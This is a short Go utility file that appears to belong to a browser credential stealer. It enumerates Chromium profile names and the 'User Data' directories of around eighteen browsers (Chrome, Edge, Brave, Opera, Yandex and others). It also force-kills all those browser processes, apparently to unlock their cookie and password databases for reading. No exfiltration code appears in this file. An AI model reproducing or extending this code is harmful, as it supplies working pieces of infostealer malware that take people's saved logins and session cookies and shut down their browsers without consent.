package util

import (
	"os"
	"os/exec"
)

func GetProfiles() []string {
	var profiles = []string{
		"Default",
		"Profile 1",
		"Profile 2",
		"Profile 3",
		"Profile 4",
		"Profile 5",
	}
	return profiles
}

func GetBPth() []string {
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")
	var paths = []string{
		local + "\\Amigo\\User Data",
		local + "\\Torch\\User Data",
		local + "\\Kometa\\User Data",
		local + "\\Orbitum\\User Data",
		local + "\\CentBrowser\\User Data",
		local + "\\7Star\\7Star\\User Data",
		local + "\\Sputnik\\Sputnik\\User Data",
		local + "\\Vivaldi\\User Data",
		local + "\\Google\\Chrome SxS\\User Data",
		local + "\\Google\\Chrome\\User Data",
		local + "\\Epic Privacy Browser\\User Data",
		local + "\\Microsoft\\Edge\\User Data",
		local + "\\uCozMedia\\Uran\\User Data",
		local + "\\Yandex\\YandexBrowser\\User Data",
		local + "\\BraveSoftware\\Brave-Browser\\User Data",
		local + "\\Iridium\\User Data",
		roaming + "\\Opera Software\\Opera Stable",
		roaming + "\\Opera Software\\Opera GX Stable",
	}
	return paths
}

func StringToByte(s string) []byte {
	return []byte(s)
}

func CloseBrowsers() {
	browserExe := []string{
		"chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe",
		"centbrowser.exe", "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe",
		"msedge.exe", "uran.exe", "yandex.exe", "iridium.exe",
	}

	for _, exe := range browserExe {
		exec.Command("taskkill", "/F", "/IM", exe, "/T").Run()
	}
}
